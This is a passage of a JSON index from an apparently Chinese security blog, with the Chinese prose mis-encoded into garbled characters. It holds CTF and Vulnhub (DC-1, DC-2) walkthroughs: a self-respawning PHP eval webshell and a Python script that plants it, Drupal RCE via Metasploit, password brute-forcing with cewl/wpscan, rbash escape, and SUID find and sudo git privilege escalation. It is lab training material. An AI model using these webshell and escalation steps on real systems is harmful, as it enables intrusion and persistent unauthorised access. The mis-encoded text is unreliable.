data2={\u0026#39;cmd\u0026#39;:\u0026#34;system(\u0026#39;sleep 3;cd /tmp;php -S 0.0.0.0:80\u0026#39;);\u0026#34;} try: requests.post(url+\u0026#39;?action=cmd\u0026#39;,data=data2,timeout=(1,1)) except: requests.get(url+\u0026#39;?action=check\u0026#39;) while True: r=requests.post(url,data={\u0026#39;1\u0026#39;:\u0026#39;system(\u0026#34;cat /f*\u0026#34;);\u0026#39;}) if \u0026#34;ctfshow{\u0026#34; in r.text: print(r.text) break æ€»ç»“ ä¸»è¦è¿ç”¨çš„æ˜¯checkä¸æ€è¿›ç¨‹çš„æ€è·¯ï¼Œè§£æ³•éå¸¸çš„ctfï¼Œåœ¨å®æˆ˜çš„ç»´æŒä¸­å¾€å¾€éœ€è¦è€ƒè™‘éšè”½æ€§å’ŒæŒä¹…æ€§ï¼Œæ‰€ä»¥ä¸Šé¢çš„é¢˜é¡¶å¤šç»™ctfä½œä½œå‚è€ƒ\n",
        "summary": "ctfshow-æƒé™ç»´æŒ web670 è¿™é‡Œçš„checkè²Œä¼¼æ˜¯åˆ webæ ¹ç›®å½•æ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨awdçš„å¸¸è§„æ€è·¯ï¼Œå†™ä¸€ä¸ªä¸æ­»é©¬ï¼š\nGET:?action=cmd POST:cmd=file_put_contents(\u0026#39;a.php\u0026#39;, \u0026#39;\u0026lt;?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = \\\u0026#39;shell.php\\\u0026#39;;$code = \\\u0026#39;\u0026lt;?php @eval($_POST[1]);?\u0026gt;\\\u0026#39;;while (1) {file_put_contents($file, $code);usleep(5000);}?\u0026gt;\u0026#39;); è®¿é—®ä¸æ­»é©¬ä½¿å…¶è§£æï¼Œå°†æœ¨é©¬å†™å…¥å†…å­˜\nç„¶åç”³è¯·checkï¼Œå†è¿æ¥shell.phpå³å¯ï¼š\nweb671 åŒæ ·å†™ä¸æ­»é©¬å³å¯ï¼Œflagåœ¨æ ¹ç›®å½•ï¼š\nweb672 åŒç†ï¼š\nweb673 åŒç†ã€‚ã€‚\næ—¢ç„¶ä¸æ­»é©¬ä¸€ç›´èƒ½æ‰“ï¼Œé‚£æˆ‘ä»¬å¯ä»¥å°è¯•æ„é€ ä¸€ä¸ªpythonè„šæœ¬ï¼š\nimport requests url=\u0026#34;http://ed21030c-afd5-4efd-a3c6-d6728eef56f5.challenge.ctf.show/\u0026#34; data1={\u0026#39;cmd\u0026#39;:\u0026#34;file_put_contents(\u0026#39;a.php\u0026#39;,\\\u0026#34;\u0026lt;?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);\\\\$file = \u0026#39;shell.php\u0026#39;;\\\\$code = \u0026#39;\u0026lt;?php @eval(\\\\$_POST[1]);?\u0026gt;\u0026#39;;while (1) {file_put_contents(\\\\$file, \\\\$code);usleep(5000);}?\u0026gt;\\\u0026#34;);\u0026#34;} r=requests.post(url+\u0026#39;?action=cmd\u0026#39;,data=data1) try: requests.get(url+\u0026#39;a.php\u0026#39;,timeout=(1,1)) except: requests.get(url+\u0026#39;?action=check\u0026#39;) r=requests.post(url+\u0026#39;shell.php\u0026#39;,data={\u0026#39;1\u0026#39;:\u0026#39;system(\u0026#34;cat /f*\u0026#34;);\u0026#39;}) print(r.text) ä¸€è·‘å³å‡ºï¼š\nweb674-676 åŒç†ï¼Œè„šæœ¬è·‘å³å¯\nweb677 é™¤äº†tmpç›®å½•éƒ½æ²¡æœ‰å†™æƒé™\nè¿™é‡ŒåŒæ ·å¯ä»¥ç”¨åŠ è½½è¿›ç¨‹çš„æ€ç»´ï¼š\nGET:?action=cmd POST:cmd=system(\u0026#39;sleep 10;cat /f*\u0026#39;); æ‰§è¡Œåä¼šåŠ è½½åç§’ï¼Œåœ¨æ­¤æœŸé—´ï¼Œå¦å¼€ä¸€ä¸ªé¡µé¢æ¥å¯åŠ¨checkï¼Œå³å¯catåˆ°flagï¼š\nweb678 checkåï¼Œä¼šåœæ­¢ä¸€åˆ‡webæœåŠ¡ï¼ŒåŒ…æ‹¬nginx php-fpm å¤©åœ°åŒå¯¿çš„æ‰“æ³•ï¼Œä½ èƒ½åº”ä»˜å—\ntmpç›®å½•å¯å†™ï¼Œé‚£ä¹ˆå°±åœ¨è¿™ä¸ªç›®å½•ä¸Šåšæ–‡ç« \nä¸­é—´ä»¶éƒ½æ²¡äº†ï¼Œé‚£å°±ç”¨phpç›´æ¥åœ¨/tmpèµ·ä¸€ä¸ªæœåŠ¡ï¼Œå°±èƒ½è§£ætmpä¸­çš„phpæ–‡ä»¶äº†\ntmpç›®å½•ä¸‹ç”Ÿæˆæœ¨é©¬æ–‡ä»¶:\ncmd=system(\u0026#39;cd /tmp;echo \u0026#34;\u0026lt;?php eval(\\$_POST[1]);?\u0026gt;\u0026#34; \u0026gt; index.php\u0026#39;); å¼€å¯webæœåŠ¡ï¼š\n"
    }
,
    {
        "title": "DC-1æ¸—é€ç¬”è®°",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-1%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/",
        "content": "DC-1æ¸—é€ç¬”è®° ä¿¡æ¯æœé›† æ¢æµ‹IP nmapæ‰«ä¸€ä¸‹ï¼š\nnmap -sP 192.168.111.0/24 å‘ç°IPä¸º192.168.111.143\nç«¯å£æ¢æµ‹ nmapæ‰«ææ‰€æœ‰ç«¯å£çš„ä¿¡æ¯ï¼š\nnmap -sV -p- 192.168.111.143 å¯ä»¥çœ‹è§å¼€æ”¾äº†ï¼š\n22ç«¯å£\n80ç«¯å£\n111ç«¯å£\n49525ç«¯å£\nè¿™é‡Œ80ç«¯å£å’Œ22ç«¯å£å¯èƒ½æ¯”è¾ƒé‡è¦ï¼Œæˆ‘å…ˆä»80ç«¯å£çš„webæœåŠ¡å…¥æ‰‹\nç½‘é¡µä¿¡æ¯æœé›† æµè§ˆå™¨è®¿é—®80ç«¯å£ï¼š\néœ€è¦ç™»å½•ï¼Œæ²¡ä»€ä¹ˆå¤´ç»ªï¼Œå†çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–åˆ©ç”¨ç‚¹\nç”¨wappalyzerå¯ä»¥çœ‹è§cmsã€è¯­è¨€ã€ä¸­é—´ä»¶ã€æ“ä½œç³»ç»Ÿç­‰åŸºæœ¬ä¿¡æ¯ï¼š\nDrupal 7 PHP 5.4.45 Apache 2.2.22 debian è·‘ä¸€ä¸‹ç›®å½•çœ‹çœ‹ï¼š\ndirsearch -u 192.168.111.143 æ‰«åˆ°å¾ˆå¤šç›®å½•ä½†æ˜¯ä½œç”¨ä¸æ˜¯å¾ˆå¤§\næ¼æ´åˆ©ç”¨ é¦–å…ˆä»cmså…¥æ‰‹çœ‹çœ‹æœ‰æ²¡æœ‰å†å²æ¼æ´ï¼Œæœç´¢ä¸€ä¸‹è¿˜çœŸæœ‰ä¸ª18å¹´çš„CVE\nç›´æ¥ä¸Šmsfçœ‹çœ‹æœ‰æ²¡æœ‰ç°æˆçš„è„šæœ¬ï¼š\nsearch Drupal åº”è¯¥å°±æ˜¯18å¹´é‚£ä¸ªäº†ï¼Œuseä¸€ä¸‹ï¼Œå¡«å¥½å‚æ•°ç›´æ¥å¼€æ‰“ï¼š\nè¿™å°±æ‹¿shelläº†ï¼Œå¥½å¿«\nåæ¸—é€ è·å–äº¤äº’å¼shellï¼ˆflag1ã€flag2ï¼‰ è¾“å…¥shellå³å¯è¿›å…¥linuxçš„shellï¼Œå°±æ˜¯æœ‰ç‚¹ä¸‘\nè€è§„çŸ©ï¼Œè¯•è¯•ç”¨pythonè·å–ä¸€ä¸ªpty\npython -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; OKäº†ï¼Œçœ‹æ¥æ˜¯è£…äº†pythonçš„ï¼š\nè¿™é‡Œæœ‰ä¸ªflag1.txtï¼Œcatä¸€ä¸‹ï¼š\nç¿»è¯‘ä¸€ä¸‹ï¼šæ¯ä¸ªå¥½çš„CMSéƒ½éœ€è¦ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œä½ ä¹Ÿä¸€æ ·\né‚£è¿™é‡Œå°±æ˜¯å‘Šè¯‰æˆ‘ä¸‹ä¸€æ­¥å¾—å»çœ‹è¿™ä¸ªdrupal cmsçš„é…ç½®æ–‡ä»¶äº†\nçœ‹çœ‹æœ‰æ²¡æœ‰settings.phpï¼š\nè¿˜çœŸæ˜¯ï¼Œç›´æ¥catçœ‹çœ‹ï¼š\nè¿™é‡Œè·å¾—äº†flag2ï¼šæš´åŠ›ç ´è§£å’Œå­—å…¸æ”»å‡»å¹¶ä¸æ˜¯è·å–è®¿é—®æƒé™ï¼ˆè€Œä½ è‚¯å®šéœ€è¦è®¿é—®æƒé™ï¼‰çš„å”¯ä¸€æ–¹å¼ã€‚æœ‰äº†è¿™äº›å‡­è¯ï¼Œä½ èƒ½åšä»€ä¹ˆï¼Ÿ\nè€Œä¸‹é¢è¿˜ç»™å‡ºäº†mysqlæ•°æ®åº“çš„è´¦å¯†ï¼Œå¾ˆæ˜æ˜¾ä¸‹ä¸€æ­¥è¦è¿›æ•°æ®åº“äº†\næ•°æ®åº“çš„åˆ©ç”¨ï¼ˆflag3ã€flag4ï¼‰ ç›´æ¥ç™»å½•mysqlï¼š\nåˆ‡æ¢æ•°æ®åº“åˆ°drupaldbï¼Œå¹¶çœ‹çœ‹æœ‰å“ªäº›è¡¨ï¼š\næœ‰ä¸ªè¡¨å«userå¾ˆå¯ç–‘ï¼Œçœ‹çœ‹ï¼š\nè¿™é‡Œå‘ç°ä¸¤ä¸ªè´¦å¯†ï¼Œä½†å¯†ç ä¸æ˜¯æ˜æ–‡ï¼ŒåŠ å¯†ä¹Ÿå¾ˆå¥‡æ€ªä¸æ˜¯å¸¸è§„åŠ å¯†ï¼Œåº”è¯¥æ˜¯drupalè‡ªå·±å®šä¹‰çš„ï¼Œä¸Šç½‘æœä¸€ä¸‹ï¼š\nä¸Šå›¾çš„æ–¹æ³•äºŒå¾ˆä¸é”™ï¼Œè¯•è¯•ï¼š\nå…ˆæ‰¾åˆ°è„šæœ¬è·¯å¾„ï¼š\næˆ‘ä»¬å°†å¯†ç æ”¹ä¸ºadminï¼š\nphp /var/www/scripts/password-hash.sh admin å³å¯å¾—åˆ°åŠ å¯†åçš„å¯†ç hashï¼š\n$S$DBPc9i1Q6Cny/HTW4zhwWrwSTaRNndxlAQeqSZAlyebP9MAHBSuu æ¥ä¸‹æ¥å›åˆ°mysqlä¿®æ”¹adminå’Œfredçš„å¯†ç \nupdate users set pass = \u0026#34;$S$DBPc9i1Q6Cny/HTW4zhwWrwSTaRNndxlAQeqSZAlyebP9MAHBSuu\u0026#34; where name = \u0026#39;admin\u0026#39; or name = \u0026#39;Fred\u0026#39;; æ¥ä¸‹æ¥æœ‰äº†è´¦æˆ·å¯†ç ï¼Œæˆ‘ä»¬ç™»å½•åå°çœ‹çœ‹ï¼š\nåœ¨åå°æ‰¾åˆ°äº†flag3ï¼šç‰¹æ®Šçš„æƒé™è®¾ç½®å°†å¸®åŠ©æ‰¾åˆ°passwd - ä½†ä½ éœ€è¦ä½¿ç”¨-execå‘½ä»¤æ¥ç ´è§£å¦‚ä½•è·å–shadowæ–‡ä»¶ä¸­çš„å†…å®¹\nè¯•è¯•ï¼Œå¯ä»¥æŸ¥çœ‹/etc/passwdï¼Œä½†æ²¡æœ‰æƒé™æŸ¥çœ‹/etc/shadowï¼š\n/etc/passwdä¸­æœ‰flag4è¿™ä¸ªç”¨æˆ·ï¼Œè¿˜æœ‰ä¸ªè·¯å¾„/home/flag4ï¼Œå»çœ‹çœ‹æœ‰ä»€ä¹ˆ\næ‰¾åˆ°flag4ï¼šæ‚¨èƒ½ä½¿ç”¨ç›¸åŒçš„æ–¹æ³•æ‰¾åˆ°æˆ–è®¿é—®æ ¹ç›®å½•ä¸­çš„flagå—ï¼Ÿä¹Ÿè®¸å¯ä»¥ã€‚ä½†æˆ–è®¸å¹¶ä¸é‚£ä¹ˆå®¹æ˜“ã€‚æˆ–è®¸ä¹Ÿå¯èƒ½æ˜¯è¿™æ ·ï¼Ÿ\næŒ‰ç…§æè¿°ï¼Œå»/rootçœ‹çœ‹ï¼š\næƒé™ä¸å¤Ÿï¼Œæ¥ä¸‹æ¥åº”è¯¥å°±æ˜¯ææƒäº†\næƒé™æå‡ï¼ˆflag5ï¼‰ çœ‹çœ‹æœ‰å“ªäº›suidæƒé™çš„æ–‡ä»¶ï¼š\nfind / -perm -u=s -type f 2\u0026gt;/dev/null è¿˜æŒºå¤šï¼Œå…¶ä¸­çš„findéå¸¸é†’ç›®å•Šï¼Œç›´æ¥findææƒä¸€æ‰‹ï¼š\nfind / -name flag4.txt -exec \u0026#34;/bin/sh\u0026#34; \\; okå·²ç»æ‹¿ä¸‹rootæƒé™äº†ï¼Œæ¥ä¸‹æ¥å»/rootçœ‹çœ‹ï¼š\næ‹¿åˆ°äº†æœ€ç»ˆçš„flag5ï¼š\nåšå¾—å¥½!!!! å¸Œæœ›ä½ äº«å—äº†è¿™ä¸ªè¿‡ç¨‹ï¼Œå¹¶å­¦åˆ°äº†ä¸€äº›æ–°æŠ€èƒ½ã€‚ ä½ å¯ä»¥é€šè¿‡Twitterè”ç³»æˆ‘ï¼Œå‘Šè¯‰æˆ‘ä½ å¯¹è¿™æ¬¡å°æ—…ç¨‹çš„æƒ³æ³• - @DCAU7 æ€»ç»“ åœ¨æ¸—é€è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬è¿›è¡Œäº†å¦‚ä¸‹æ¼æ´åˆ©ç”¨ï¼š\ndrupal cmsçš„ä¸€ä¸ªRCE é…ç½®æ–‡ä»¶æ³„éœ²mysqlè´¦å·å¯†ç  åˆ©ç”¨cmsçš„åŠ å¯†è„šæœ¬å’Œmysqlé‡ç½®cmsçš„ç®¡ç†å‘˜å¯†ç  findææƒ ",
        "summary": "DC-1æ¸—é€ç¬”è®° ä¿¡æ¯æœé›† æ¢æµ‹IP nmapæ‰«ä¸€ä¸‹ï¼š\nnmap -sP 192.168.111.0/24 å‘ç°IPä¸º192.168.111.143\nç«¯å£æ¢æµ‹ nmapæ‰«ææ‰€æœ‰ç«¯å£çš„ä¿¡æ¯ï¼š\nnmap -sV -p- 192.168.111.143 å¯ä»¥çœ‹è§å¼€æ”¾äº†ï¼š\n22ç«¯å£\n80ç«¯å£\n111ç«¯å£\n49525ç«¯å£\nè¿™é‡Œ80ç«¯å£å’Œ22ç«¯å£å¯èƒ½æ¯”è¾ƒé‡è¦ï¼Œæˆ‘å…ˆä»80ç«¯å£çš„webæœåŠ¡å…¥æ‰‹\nç½‘é¡µä¿¡æ¯æœé›† æµè§ˆå™¨è®¿é—®80ç«¯å£ï¼š\néœ€è¦ç™»å½•ï¼Œæ²¡ä»€ä¹ˆå¤´ç»ªï¼Œå†çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–åˆ©ç”¨ç‚¹\nç”¨wappalyzerå¯ä»¥çœ‹è§cmsã€è¯­è¨€ã€ä¸­é—´ä»¶ã€æ“ä½œç³»ç»Ÿç­‰åŸºæœ¬ä¿¡æ¯ï¼š\nDrupal 7 PHP 5.4.45 Apache 2.2.22 debian è·‘ä¸€ä¸‹ç›®å½•çœ‹çœ‹ï¼š\ndirsearch -u 192.168.111.143 æ‰«åˆ°å¾ˆå¤šç›®å½•ä½†æ˜¯ä½œç”¨ä¸æ˜¯å¾ˆå¤§\næ¼æ´åˆ©ç”¨ é¦–å…ˆä»cmså…¥æ‰‹çœ‹çœ‹æœ‰æ²¡æœ‰å†å²æ¼æ´ï¼Œæœç´¢ä¸€ä¸‹è¿˜çœŸæœ‰ä¸ª18å¹´çš„CVE\nç›´æ¥ä¸Šmsfçœ‹çœ‹æœ‰æ²¡æœ‰ç°æˆçš„è„šæœ¬ï¼š\nsearch Drupal åº”è¯¥å°±æ˜¯18å¹´é‚£ä¸ªäº†ï¼Œuseä¸€ä¸‹ï¼Œå¡«å¥½å‚æ•°ç›´æ¥å¼€æ‰“ï¼š\nè¿™å°±æ‹¿shelläº†ï¼Œå¥½å¿«\nåæ¸—é€ è·å–äº¤äº’å¼shellï¼ˆflag1ã€flag2ï¼‰ è¾“å…¥shellå³å¯è¿›å…¥linuxçš„shellï¼Œå°±æ˜¯æœ‰ç‚¹ä¸‘\nè€è§„çŸ©ï¼Œè¯•è¯•ç”¨pythonè·å–ä¸€ä¸ªpty\npython -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; OKäº†ï¼Œçœ‹æ¥æ˜¯è£…äº†pythonçš„ï¼š\nè¿™é‡Œæœ‰ä¸ªflag1.txtï¼Œcatä¸€ä¸‹ï¼š\nç¿»è¯‘ä¸€ä¸‹ï¼šæ¯ä¸ªå¥½çš„CMSéƒ½éœ€è¦ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œä½ ä¹Ÿä¸€æ ·\né‚£è¿™é‡Œå°±æ˜¯å‘Šè¯‰æˆ‘ä¸‹ä¸€æ­¥å¾—å»çœ‹è¿™ä¸ªdrupal cmsçš„é…ç½®æ–‡ä»¶äº†\nçœ‹çœ‹æœ‰æ²¡æœ‰settings.phpï¼š\nè¿˜çœŸæ˜¯ï¼Œç›´æ¥catçœ‹çœ‹ï¼š\nè¿™é‡Œè·å¾—äº†flag2ï¼šæš´åŠ›ç ´è§£å’Œå­—å…¸æ”»å‡»å¹¶ä¸æ˜¯è·å–è®¿é—®æƒé™ï¼ˆè€Œä½ è‚¯å®šéœ€è¦è®¿é—®æƒé™ï¼‰çš„å”¯ä¸€æ–¹å¼ã€‚æœ‰äº†è¿™äº›å‡­è¯ï¼Œä½ èƒ½åšä»€ä¹ˆï¼Ÿ\nè€Œä¸‹é¢è¿˜ç»™å‡ºäº†mysqlæ•°æ®åº“çš„è´¦å¯†ï¼Œå¾ˆæ˜æ˜¾ä¸‹ä¸€æ­¥è¦è¿›æ•°æ®åº“äº†\n"
    }
,
    {
        "title": "DC-2æ¸—é€ç¬”è®°",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-2%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/",
        "content": "vulnhub-DC:2æ¸—é€ç¬”è®° ä¿¡æ¯æœé›† IPæ¢æµ‹ è€è§„çŸ©ï¼Œå…ˆæ¢æµ‹ä¸€ä¸‹IPï¼š\nnmap -sP 192.168.111.0/24 ç¡®å®šIPä¸º192.168.111.144\nç«¯å£æ¢æµ‹ çœ‹çœ‹å¼€äº†å“ªäº›ç«¯å£ï¼š\nnmap -sV -p- 192.168.111.144 å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†ä¸¤ä¸ªç«¯å£ï¼š\n80ç«¯å£ï¼Œè¿™ä¸ªåº”è¯¥å°±æ˜¯webæœåŠ¡ 7744ç«¯å£ï¼Œä¼¼ä¹æ˜¯æŠŠsshæœåŠ¡é»˜è®¤çš„22æ”¹æˆäº†7744 ç½‘é¡µä¿¡æ¯æ”¶é›† æµè§ˆå™¨è®¿é—®80ç«¯å£çœ‹çœ‹ï¼š\nä¸èƒ½è®¿é—®ï¼Œä½†æ˜¾ç¤ºäº†ä¸ªdc-2ï¼Œè¿™é‡Œæ¶‰åŠä¸€ä¸ªdnsè§£æé¡ºåºçš„é—®é¢˜ï¼š\næ ¹æ®Windowsç³»ç»Ÿè§„å®šï¼Œåœ¨è¿›è¡ŒDNSè¯·æ±‚ä»¥å‰ï¼ŒWindowsç³»ç»Ÿä¼šå…ˆæ£€æŸ¥è‡ªå·±çš„Hostsæ–‡ä»¶ä¸­æ˜¯å¦æœ‰è¿™ä¸ªåœ°å€æ˜ å°„å…³ç³»ï¼Œå¦‚æœæœ‰åˆ™è°ƒç”¨è¿™ä¸ªIPåœ°å€æ˜ å°„ï¼Œå¦‚æœæ²¡æœ‰å†å‘å·²çŸ¥çš„DNSæœåŠ¡å™¨æå‡ºåŸŸåè§£æã€‚ ä¹Ÿå°±æ˜¯è¯´Hostsçš„è¯·æ±‚çº§åˆ«æ¯”DNSé«˜ æ‰€ä»¥æˆ‘ä»¬ä¿®æ”¹C:/Windows/System32/drivers/etc/HOSTSæ–‡ä»¶è¿›è¡Œhostç¢°æ’ï¼š\nokç°åœ¨å†è®¿é—®ä¸€ä¸‹è¿›å…¥webæœåŠ¡ï¼š\nå¯ä»¥è®¿é—®äº†ä¸”å‘ç°äº†flag1ï¼š\nä½ é€šå¸¸ä½¿ç”¨çš„å­—å…¸å¯èƒ½è¡Œä¸é€šï¼Œæ‰€ä»¥ä¹Ÿè®¸ä½ éœ€è¦ä½¿ç”¨cewlã€‚ æ›´å¤šçš„å¯†ç æ€»æ˜¯æ›´å¥½ï¼Œä½†æœ‰æ—¶ä½ å°±æ˜¯æ— æ³•èµ¢å¾—æ‰€æœ‰çš„ã€‚ ç™»å½•ä¸ºä¸€ä¸ªç”¨æˆ·æ¥æŸ¥çœ‹ä¸‹ä¸€ä¸ªflag å¦‚æœæ‰¾ä¸åˆ°å®ƒï¼Œå°è¯•ä»¥å¦ä¸€ä¸ªèº«ä»½ç™»å½• ä»–è¿™é‡Œåº”è¯¥æ˜¯è®©æˆ‘ä½¿ç”¨cewlè¿›è¡Œå¯†ç æ”»å‡»ï¼Œä½†å¹¶ä¸ä»£è¡¨åªæœ‰è¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬æ¥ç€çœ‹çœ‹\nä¾æ—§æ˜¯é€šè¿‡wappalyzerå¾—åˆ°webæœåŠ¡çš„åŸºæœ¬ä¿¡æ¯ï¼š\nwordpress 4.7.10 phpè¯­è¨€ Apache debianç³»ç»Ÿ mysqlæ•°æ®åº“ è¿˜æ˜¯dirsearchæ‰«ä¸€æ‰«ç›®å½•ï¼š\næ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«æœ‰ç”¨çš„ä¿¡æ¯\næ¼æ´åˆ©ç”¨ wordpressï¼ˆflag1ã€flag2ï¼‰ æ ¹æ®æç¤ºä½¿ç”¨kaliè‡ªå¸¦çš„cewlç”Ÿæˆå¯†ç å­—å…¸ï¼š\ncewl http://dc-2/ -w dict.txt\t//ä¿å­˜åœ¨dict.txtä¸­ è¿™ä¸ªtxtä½œä¸ºæˆ‘ä»¬åç»­çˆ†ç ´ç”¨çš„å­—å…¸\næ¥ä¸‹æ¥æŒ‰ç…§flag1çš„æç¤ºï¼Œæ˜¯è¦è¿›è¡Œç™»å½•ï¼Œé’ˆå¯¹wordpressä¸€èˆ¬å¯ä»¥è¯•è¯•wpscanï¼š\nç”¨wpscanæšä¸¾ä¸€ä¸‹ç”¨æˆ·å\nwpscan --url http://dc-2/ --enumerate u å‘ç°ä¸‰ä¸ªç”¨æˆ·åï¼Œæˆ‘ä»¬åŒæ ·å°†ä»–ä»¬ä¿å­˜è‡³user.txt\næ¥ä¸‹æ¥æ˜¯é’ˆå¯¹ç”¨æˆ·çš„å¯†ç çˆ†ç ´ï¼Œç”¨æˆ·åå’Œå¯†ç çš„å­—å…¸æŒ‡å®šä¸ºæˆ‘ä»¬ä¿å­˜çš„å­—å…¸ï¼š\nwpscan --url http://dc-2/ -U user.txt -P dict.txt å¯ä»¥çœ‹è§ï¼Œjerryå’Œtomçš„å¯†ç éƒ½è¢«çˆ†ç ´å‡ºæ¥äº†ï¼Œè®©æˆ‘ä»¬ç™»å½•è¯•è¯•\nç™»å½•jerryçš„è´¦å·å‘ç°äº†flag2ï¼šå¦‚æœä½ æ— æ³•åˆ©ç”¨WordPresså¹¶èµ°æ·å¾„ï¼Œè¿˜æœ‰å¦ä¸€ç§æ–¹å¼ã€‚å¸Œæœ›ä½ æ‰¾åˆ°äº†å¦ä¸€ä¸ªå…¥å£ç‚¹ã€‚\nåå°ç¡®å®æ²¡æœ‰ä»€ä¹ˆçªç ´å£äº†ï¼Œè€Œflag2æç¤ºè¦å¯»æ‰¾å…¶ä»–åˆ©ç”¨ç‚¹ï¼Œé¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯è¿˜æœªæ›¾ä½¿ç”¨çš„sshæœåŠ¡äº†\nSSHï¼ˆflag3ï¼‰ æˆ‘ä»¬æ”¶é›†åˆ°äº†2å¯¹è´¦å¯†ï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹æ˜¯å¦èƒ½è¿œç¨‹è¿æ¥sshï¼š\nä½¿ç”¨jerryçš„è´¦å¯†è¿æ¥å‘ç°å¯†ç é”™è¯¯ï¼Œè€Œä½¿ç”¨tomçš„è´¦å·è¿æ¥æˆåŠŸï¼Œç›´æ¥æ‹¿åˆ°shell\nåœ¨å½“å‰ç›®å½•å‘ç°flag3.txtï¼Œä½†æ— æ³•catï¼š\nä½¿ç”¨viçœ‹çœ‹ï¼š\næ‹¿åˆ°flag3ï¼šå¯æ€œçš„è€æ±¤å§†æ€»æ˜¯è¿½èµ¶æ°ç‘ã€‚æˆ–è®¸ä»–åº”è¯¥å› ä¸ºæ‰€æœ‰çš„å‹åŠ›èµ·è¯‰æ°ç‘ã€‚\nåæ¸—é€ rbashé€ƒé€¸ï¼ˆflag4ï¼‰ å› ä¸ºå½“å‰shellæ˜¯rbashï¼Œè€ƒè™‘è¿›è¡Œrbashé€ƒé€¸\nè¿™é‡Œé¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯åˆ©ç”¨viè¿›è¡Œé€ƒé€¸ï¼Œè¾“å…¥æœ«è¡Œå‘½ä»¤ï¼š\n:set shell=/bin/bash shell å¦‚æ­¤ï¼Œå³å¯æˆåŠŸå®ç°ç»•è¿‡é™åˆ¶ï¼š\nä½†æ˜¯è¿™ä¸ªshellæœ‰å¾ˆå¤šå‘½ä»¤æ— æ³•æ‰§è¡Œï¼šsuã€sudoã€git\u0026hellip;\u0026hellip;ï¼Œæˆ‘ä»¬éœ€è¦å°†å‘½ä»¤æ·»åŠ è‡³ç¯å¢ƒå˜é‡ï¼š\nexport PATH=$PATH:/bin/ export PATH=$PATH:/usr/bin è¿™æ ·å°±å¯ä»¥suå‘½ä»¤åˆ‡æ¢åˆ°jerryç”¨æˆ·ï¼Œå¯†ç è¿˜æ˜¯è¯•è¯•wordpressçš„å¯†ç ï¼š\næˆåŠŸåˆ‡æ¢åˆ°jerryç”¨æˆ·ï¼Œåœ¨ç”¨æˆ·çš„å®¶ç›®å½•å‘ç°äº†flag4ï¼š\nçœ‹çœ‹å†…å®¹ï¼š\nå“ä¸€ä¸‹ï¼šå¾ˆé«˜å…´çœ‹åˆ°ä½ èµ°äº†è¿™ä¹ˆè¿œï¼Œä½†ä½ è¿˜æ²¡åˆ°å®¶ã€‚ä½ è¿˜éœ€è¦æ‰¾åˆ°æœ€åä¸€ä¸ªflagï¼ˆçœŸæ­£é‡è¦çš„flagï¼‰ã€‚è¿™é‡Œæ²¡æœ‰æç¤ºï¼Œä½ åªèƒ½é è‡ªå·±äº†ã€‚å¿«èµ°ï¼Œï¼ˆgitï¼‰ç¦»å¼€è¿™é‡Œ\ngitææƒï¼ˆflag5ï¼‰ å¾ˆæ˜æ˜¾ï¼Œflag4çš„æç¤ºå°±æ˜¯gitåˆ©ç”¨æ¥ææƒäº†ï¼š\nçœ‹çœ‹æœ‰å“ªäº›å‘½ä»¤å¯ä»¥sudoæ‰§è¡Œ\nsudo -l è¿˜çœŸæ˜¯ï¼Œgitèƒ½sudoæ‰§è¡Œè€Œä¸”ä¸ç”¨è¾“å…¥å¯†ç ï¼Œç›´æ¥ç”¨gitæ‰“sudoææƒï¼š\né¦–å…ˆå¾—å°†shellçª—å£å˜çª„ï¼Œè®©å›æ˜¾ä¿¡æ¯ä¸èƒ½ä¸€é¡µæ˜¾ç¤ºï¼Œå†æŸ¥çœ‹gitå¸®åŠ©æ–‡æ¡£\nsudo git -p help æ­¤æ—¶å¯ä»¥è¾“å…¥æœ«è¡Œå‘½ä»¤ï¼š\n!/bin/bash å³å¯è·å¾—æƒé™ä¸ºrootçš„shellï¼š\nçœ‹çœ‹/rootç›®å½•ï¼š\næˆåŠŸæ‰¾åˆ°äº†æœ€åä¸€ä¸ªflag\næ€»ç»“ æ¸—é€è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬åˆ©ç”¨äº†å¦‚ä¸‹æ”»å‡»æ‰‹æ®µï¼š\ncewlé…åˆwpscançˆ†ç ´wordpressç”¨æˆ·è´¦å¯† å¯†ç å¤ç”¨ï¼Œsshè¿æ¥ä¸»æœºgetshell åˆ©ç”¨vimæœ«è¡Œå‘½ä»¤è¿›è¡Œé€ƒé€¸ï¼Œçªç ´rbashé™åˆ¶ å¯†ç å¤ç”¨åˆ‡æ¢shellè´¦æˆ· åˆ©ç”¨gitå¸®åŠ©æ–‡æ¡£æœ«è¡Œå‘½ä»¤å®ç°sodoææƒ ",
